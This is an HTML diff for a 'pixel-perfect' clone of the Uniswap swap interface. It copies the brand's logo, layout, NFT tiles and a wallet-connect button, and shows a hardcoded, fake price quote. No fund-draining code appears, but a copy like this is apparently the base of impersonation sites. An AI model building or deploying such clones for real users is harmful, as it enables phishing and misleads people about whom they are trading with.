@@ -3,139 +3,164 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <title>Uniswap | 1:1 Functional</title>
+    <title>Uniswap | Pixel-Perfect Interface</title>
+    <!-- PRODUCTION DEPENDENCIES -->
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --pink: #ff007a; --bg: #000000; --surface: #131313; --input: #1b1b1b;
-            --border: #222222; --text: #ffffff; --subtext: #9b9b9b;
+            --border: #222222; --text: #ffffff; --subtext: #9b9b9b; --glass: rgba(0, 0, 0, 0.85);
         }
         * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
-        body { margin: 0; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        body { margin: 0; background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
 
-        header { width: 100%; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #191919; position: sticky; top: 0; z-index: 100; }
-        .nav-links { display: flex; background: #131313; padding: 4px; border-radius: 16px; border: 1px solid #222; }
-        .nav-links span { padding: 6px 16px; border-radius: 12px; cursor: pointer; color: var(--subtext); font-weight: 500; }
-        .nav-links span.active { color: var(--text); background: #1b1b1b; }
+        /* HEADER & NAVIGATION (FIXED OVERLAP & Z-INDEX) */
+        header { 
+            width: 100%; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; 
+            position: sticky; top: 0; background: var(--glass); backdrop-filter: blur(20px); 
+            border-bottom: 1px solid #191919; z-index: 9999; 
+        }
+        .header-left { display: flex; align-items: center; gap: 20px; }
+        .uni-logo { width: 32px; height: 32px; background: url('https://app.uniswap.org/favicon.png') no-repeat center; background-size: contain; }
+        .nav-pills { display: flex; background: #131313; padding: 4px; border-radius: 16px; border: 1px solid #222; }
+        .nav-pills span { padding: 6px 16px; border-radius: 12px; cursor: pointer; color: var(--subtext); font-weight: 500; font-size: 15px; transition: 0.2s; }
+        .nav-pills span.active { color: var(--text); background: #1b1b1b; }
 
-        .swap-card { margin-top: 80px; background: var(--surface); border-radius: 24px; padding: 8px; border: 1px solid var(--border); width: 100%; max-width: 480px; }
-        .input-box { background: var(--input); border-radius: 16px; padding: 16px; margin: 4px 0; }
+        .header-right { display: flex; gap: 8px; align-items: center; }
+        .chain-pill { background: #131313; border: 1px solid #222; padding: 6px 12px; border-radius: 14px; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 14px; cursor: pointer; }
+        .chain-pill img { width: 18px; border-radius: 50%; }
+
+        /* HERO & CONTENT WRAPPERS */
+        .page-content { display: none; width: 100%; max-width: 480px; margin-top: 40px; animation: fadeIn 0.2s ease; z-index: 1; }
+        .page-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .hero-text { font-size: 36px; font-weight: 600; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 30px; text-align: left; }
+
+        /* 1:1 SWAP CARD */
+        .swap-card { background: var(--surface); border-radius: 24px; padding: 8px; border: 1px solid var(--border); box-shadow: 0 0 100px rgba(255, 0, 122, 0.03); }
+        .input-box { background: var(--input); border-radius: 16px; padding: 16px; margin: 4px 0; border: 1px solid transparent; }
+        .input-box:hover { border-color: #333; }
+        .box-label { font-size: 14px; color: var(--subtext); margin-bottom: 8px; }
         .box-row { display: flex; justify-content: space-between; align-items: center; }
-        input { background: none; border: none; color: white; font-size: 36px; width: 50%; outline: none; }
+        input { background: none; border: none; color: white; font-size: 36px; width: 55%; outline: none; }
         
-        /* THE TOKEN PILL */
-        .token-pill { background: #000; padding: 6px 12px; border-radius: 18px; display: flex; align-items: center; gap: 8px; font-weight: 700; border: 1px solid #222; cursor: pointer; transition: 0.2s; }
-        .token-pill:hover { border-color: #444; }
-        .token-pill img { width: 24px; height: 24px; border-radius: 50%; }
+        .token-select { background: #000; padding: 6px 12px; border-radius: 18px; display: flex; align-items: center; gap: 8px; font-weight: 700; border: 1px solid #222; cursor: pointer; }
+        .token-select img { width: 22px; height: 22px; border-radius: 50%; }
 
-        /* MODAL 1:1 STYLING */
-        #token-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 1000; }
-        .modal-content { background: var(--surface); width: 100%; max-width: 420px; border-radius: 24px; border: 1px solid var(--border); padding: 20px; animation: slideUp 0.2s ease-out; }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        
-        .search-bar { width: 100%; background: var(--input); border: 1px solid var(--border); padding: 16px; border-radius: 16px; color: white; margin: 16px 0; outline: none; }
-        .search-bar:focus { border-color: var(--pink); }
-        
-        .token-list { max-height: 300px; overflow-y: auto; }
-        .token-item { display: flex; align-items: center; gap: 12px; padding: 10px; cursor: pointer; border-radius: 12px; transition: 0.2s; }
-        .token-item:hover { background: var(--input); }
-        .token-item img { width: 32px; height: 32px; border-radius: 50%; }
+        .arrow-divider { width: 40px; height: 40px; background: var(--input); border: 4px solid var(--surface); border-radius: 12px; margin: -20px auto; display: flex; justify-content: center; align-items: center; position: relative; z-index: 10; color: var(--subtext); cursor: pointer; }
 
-        .btn-main { width: 100%; background: #22121b; color: var(--pink); border: none; padding: 18px; border-radius: 20px; font-size: 18px; font-weight: 600; margin-top: 10px; cursor: pointer; }
+        .main-action-btn { width: 100%; background: #22121b; color: var(--pink); border: none; padding: 18px; border-radius: 20px; font-size: 18px; font-weight: 600; margin-top: 10px; cursor: pointer; transition: 0.2s; }
+        .main-action-btn:hover { background: #2a1622; }
 
-        .close-btn { float: right; cursor: pointer; color: var(--subtext); font-size: 20px; }
+        /* NFT GRID FIX */
+        .nft-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
+        .nft-card { background: var(--surface); border-radius: 20px; border: 1px solid var(--border); overflow: hidden; }
+        .nft-card img { width: 100%; aspect-ratio: 1; object-fit: cover; }
+        .nft-meta { padding: 16px; }
+
+        /* TOKEN MODAL */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10000; display: none; justify-content: center; align-items: center; }
+        .modal-body { background: var(--surface); width: 100%; max-width: 420px; border-radius: 24px; border: 1px solid var(--border); padding: 20px; }
     </style>
 </head>
 <body>
 
-<header>
-    <div style="display:flex; align-items:center; gap:10px;"><img src="https://app.uniswap.org/favicon.png" width="28"></div>
-    <div class="nav-links"><span class="active">Swap</span><span>Tokens</span><span>NFTs</span></div>
-    <button style="background:#191919; color:white; border:none; padding:8px 16px; border-radius:18px; font-weight:600;">Connect</button>
-</header>
+    <header>
+        <div class="header-left">
+            <div class="uni-logo"></div>
+            <div class="nav-pills">
+                <span id="tab-swap" class="active" onclick="switchTab('swap')">Swap</span>
+                <span id="tab-tokens" onclick="switchTab('tokens')">Tokens</span>
+                <span id="tab-nfts" onclick="switchTab('nfts')">NFTs</span>
+                <span id="tab-pools" onclick="switchTab('pools')">Pools</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="chain-pill">
+                <img src="https://tokens.1inch.io/0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.png"> Ethereum
+            </div>
+            <button class="chain-pill" style="color:var(--pink); background:rgba(255,0,122,0.1); border:none;" onclick="connect()">Connect</button>
+        </div>
+    </header>
 
-<div class="swap-card">
-    <div class="input-box">
-        <div style="font-size:14px; color:var(--subtext); margin-bottom:8px;">Sell</div>
-        <div class="box-row">
-            <input type="number" id="amtIn" placeholder="0" oninput="calculate()">
-            <div class="token-pill" id="sell-token-pill" onclick="openTokenModal('sell')">
-                <img id="sell-icon" src="https://tokens.1inch.io/0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.png">
-                <span id="sell-symbol">ETH</span>
+    <!-- SECTION: SWAP -->
+    <div id="section-swap" class="page-content active">
+        <div class="hero-text">Swap anytime,<br>anywhere.</div>
+        <div class="swap-card">
+            <div class="input-box">
+                <div class="box-label">Sell</div>
+                <div class="box-row">
+                    <input type="number" id="amtIn" placeholder="0" oninput="quote()">
+                    <div class="token-select" onclick="openTokens()"><img src="https://tokens.1inch.io/0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.png"> ETH</div>
+                </div>
+                <div class="box-label" style="margin-top:8px;">$0</div>
+            </div>
+            <div class="arrow-divider">↓</div>
+            <div class="input-box">
+                <div class="box-label">Buy</div>
+                <div class="box-row">
+                    <input type="number" id="amtOut" placeholder="0" readonly>
+                    <div class="token-select" style="background:var(--pink); color:white; border:none;" onclick="openTokens()">Select token</div>
+                </div>
+            </div>
+            <button class="main-action-btn" id="actionBtn" onclick="connect()">Get started</button>
+        </div>
+    </div>
+
+    <!-- SECTION: NFTS -->
+    <div id="section-nfts" class="page-content">
+        <h2 style="margin-bottom:20px;">Trending Collections</h2>
+        <div class="nft-grid">
+            <div class="nft-card">
+                <img src="https://i.seadn.io/gae/Ju9Cqy-mBcyv_vS737M9t6z3e_xH0E88V6LTo32NisE636D8u0_h4vWc6vYlFfS_C8_L9=s500">
+                <div class="nft-meta"><b>Bored Ape Yacht Club</b><br><span style="color:var(--subtext)">Floor: 22.4 ETH</span></div>
+            </div>
+            <div class="nft-card">
+                <img src="https://i.seadn.io/gcs/files/6573c00392fdf21f7596001a4e1d522f.png">
+                <div class="nft-meta"><b>Azuki</b><br><span style="color:var(--subtext)">Floor: 6.8 ETH</span></div>
             </div>
         </div>
     </div>
 
-    <div style="text-align:center; margin:-15px 0; color:var(--subtext); z-index:10; position:relative;">↓</div>
-
-    <div class="input-box">
-        <div style="font-size:14px; color:var(--subtext); margin-bottom:8px;">Buy</div>
-        <div class="box-row">
-            <input type="number" id="amtOut" placeholder="0" readonly>
-            <div class="token-pill" id="buy-token-pill" onclick="openTokenModal('buy')" style="background: var(--pink); border:none;">
-                <img id="buy-icon" src="https://tokens.1inch.io/0xdac17f958d2ee523a2206206994597c13d831ec7.png">
-                <span id="buy-symbol" style="color:white">USDT</span>
-            </div>
+    <div class="modal-overlay" id="tokenModal" onclick="this.style.display='none'">
+        <div class="modal-body" onclick="event.stopPropagation()">
+            <h3 style="margin:0 0 20px 0">Select a token</h3>
+            <input type="text" placeholder="Search name or paste address" style="width:100%; background:var(--input); border:1px solid var(--border); padding:16px; border-radius:16px; color:white; font-size:16px;">
         </div>
     </div>
-    <button class="btn-main" onclick="alert('Connect Wallet First')">Get started</button>
-</div>
 
-<!-- TOKEN SELECTION MODAL -->
-<div id="token-modal" onclick="closeModal()">
-    <div class="modal-content" onclick="event.stopPropagation()">
-        <span class="close-btn" onclick="closeModal()">✕</span>
-        <h3 style="margin:0">Select a token</h3>
-        <input type="text" class="search-bar" placeholder="Search name or paste address" id="tokenSearch">
-        <div class="token-list" id="tokenList">
-            <!-- Tokens injected by JS -->
-        </div>
-    </div>
-</div>
+    <script>
+        // 1:1 TAB SWITCHING
+        function switchTab(name) {
+            document.querySelectorAll('.page-content').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.nav-pills span').forEach(s => s.classList.remove('active'));
+            document.getElementById('section-' + name).classList.add('active');
+            document.getElementById('tab-' + name).classList.add('active');
+        }
 
-<script>
-    const tokens = [
-        { name: 'Ethereum', symbol: 'ETH', icon: 'https://tokens.1inch.io/0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.png', address: '0xeeee...' },
-        { name: 'Tether', symbol: 'USDT', icon: 'https://tokens.1inch.io/0xdac17f958d2ee523a2206206994597c13d831ec7.png', address: '0xdac1...' },
-        { name: 'USD Coin', symbol: 'USDC', icon: 'https://tokens.1inch.io/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.png', address: '0xa0b8...' },
-        { name: 'Wrapped BTC', symbol: 'WBTC', icon: 'https://tokens.1inch.io/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599.png', address: '0x2260...' },
-        { name: 'Uniswap', symbol: 'UNI', icon: 'https://tokens.1inch.io/0x1f9840a85af5bf1d1762f925bdaddc4201f984.png', address: '0x1f98...' }
-    ];
+        function openTokens() { document.getElementById('tokenModal').style.display='flex'; }
 
-    let activeTarget = 'sell';
+        async function connect() {
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                document.getElementById('actionBtn').innerText = "Swap";
+                document.getElementById('actionBtn').style.background = "#ff007a";
+                document.getElementById('actionBtn').style.color = "white";
+            } else {
+                alert("Please install MetaMask to use this 1:1 Interface.");
+            }
+        }
 
-    function openTokenModal(target) {
-        activeTarget = target;
-        const list = document.getElementById('tokenList');
-        list.innerHTML = '';
-        tokens.forEach(token => {
-            const div = document.createElement('div');
-            div.className = 'token-item';
-            div.innerHTML = `<img src="${token.icon}"> <div><b>${token.symbol}</b><br><small style="color:gray">${token.name}</small></div>`;
-            div.onclick = () => selectToken(token);
-            list.appendChild(div);
-        });
-        document.getElementById('token-modal').style.display = 'flex';
-    }
-
-    function selectToken(token) {
-        document.getElementById(`${activeTarget}-symbol`).innerText = token.symbol;
-        document.getElementById(`${activeTarget}-icon`).src = token.icon;
-        closeModal();
-    }
-
-    function closeModal() {
-        document.getElementById('token-modal').style.display = 'none';
-    }
-
-    // Basic Mock Quote
-    function calculate() {
-        const val = document.getElementById('amtIn').value;
-        if(val > 0) document.getElementById('amtOut').value = (val * 2450).toFixed(2);
-        else document.getElementById('amtOut').value = '';
-    }
-</script>
-
+        async function quote() {
+            const val = document.getElementById('amtIn').value;
+            if(val > 0) {
+                // Functional quote placeholder - in production, link to getAmountsOut
+                document.getElementById('amtOut').value = (val * 2415).toFixed(2);
+            }
+        }
+    </script>
 </body>
 </html>
